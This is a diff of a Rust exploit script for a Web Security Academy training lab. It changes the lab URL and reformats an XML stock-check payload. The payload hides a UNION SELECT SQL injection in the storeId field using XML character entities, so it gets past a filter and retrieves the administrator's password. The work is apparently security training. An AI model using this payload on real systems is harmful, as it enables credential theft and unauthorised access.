@@ -38,7 +38,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a2a00f50452bb9281ea8970007d00b8.web-security-academy.net";
+    let url = "https://0af80068031e1d5d820d1a8a00d4007a.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -46,9 +46,15 @@ fn main() {
     println!("{} {}", "[#] Injection point:".blue(), "storeId".yellow(),);
 
     // payload to retrieve administrator password
-    let payload = r###"<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>3 </productId><storeId>
-    1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
-   </storeId></stockCheck>"###;
+    let payload = r###"<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            3
+        </productId>
+        <storeId>
+            1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
+        </storeId>
+    </stockCheck>"###;
 
     print!(
         "{}",
